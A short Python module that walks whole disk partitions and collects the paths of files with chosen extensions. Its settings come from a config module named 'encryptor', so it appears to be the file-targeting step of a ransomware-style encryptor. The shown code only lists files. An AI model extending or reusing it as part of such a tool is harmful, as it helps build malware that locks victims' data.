"""     libs        """
# Internal
from os import walk

# Configs
from configs.encryptor import file_extensions, search_partitions

"""     find files      """
def find_files():
    results = []
    for partition in search_partitions:
        # Walk path
        walk_path = f"{partition}/"
        # Search files
        for root, dirs, files in walk(walk_path):
            for file in files:
                for file_extension in file_extensions:
                    if file.endswith(file_extension):
                        results.append(f"{root}/{file}")
    return results
